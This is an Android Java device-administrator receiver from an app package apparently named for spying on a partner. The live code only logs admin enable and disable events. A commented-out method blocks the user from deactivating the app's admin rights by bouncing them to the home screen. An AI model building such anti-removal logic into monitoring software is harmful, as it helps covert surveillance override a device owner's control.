package chem.kth.spyforlove.device;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import androidx.annotation.NonNull;

import chem.kth.spyforlove.MainActivity;

public class DeviceAdministrationReceiver extends DeviceAdminReceiver {
    private boolean isDeviceAdminIsEnable = false;
    public static final String TAG = "admin";

    @Override
    public void onReceive(Context context, Intent intent) {
        super.onReceive(context, intent);
        Log.d(TAG, "onReceive: " + intent.getAction());
    }

    @Override
    public void onEnabled(@NonNull Context context, @NonNull Intent intent) {
        super.onEnabled(context, intent);
        isDeviceAdminIsEnable = true;
        Log.d(TAG, "onEnabled: " + isDeviceAdminIsEnable);
    }

    @Override
    public void onDisabled(@NonNull Context context, @NonNull Intent intent) {
        super.onDisabled(context, intent);
        isDeviceAdminIsEnable = false;
        Log.d(TAG, "onDisabled: " + isDeviceAdminIsEnable);
    }

    //    @Override
//    @NonNull
//    public CharSequence onDisableRequested(Context context, Intent intent) {
//        SharedPreferences settings = context.getSharedPreferences(MainApplication.class.getName(), 0);
//        String DEVICE_ADMIN_CAN_DEACTIVATE = settings.getString("DEVICE_ADMIN_CAN_DEACTIVATE", null);
//        Log.d(TAG, "onDisableRequested: " + DEVICE_ADMIN_CAN_DEACTIVATE);
//        if (DEVICE_ADMIN_CAN_DEACTIVATE.equals("ON")) {
//            Intent startMain = new Intent(Intent.ACTION_MAIN);
//            startMain.addCategory(Intent.CATEGORY_HOME);
//            startMain.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//            context.startActivity(startMain);
//            return "OOPS!";
//        } else {
////            String msg_char_onDisable = context.getResources().getString(R.string.msg_char_onDisable);
//            return "disabled";
//        }
//    }

    public boolean isDeviceAdminIsEnable() {
        return isDeviceAdminIsEnable;
    }
}

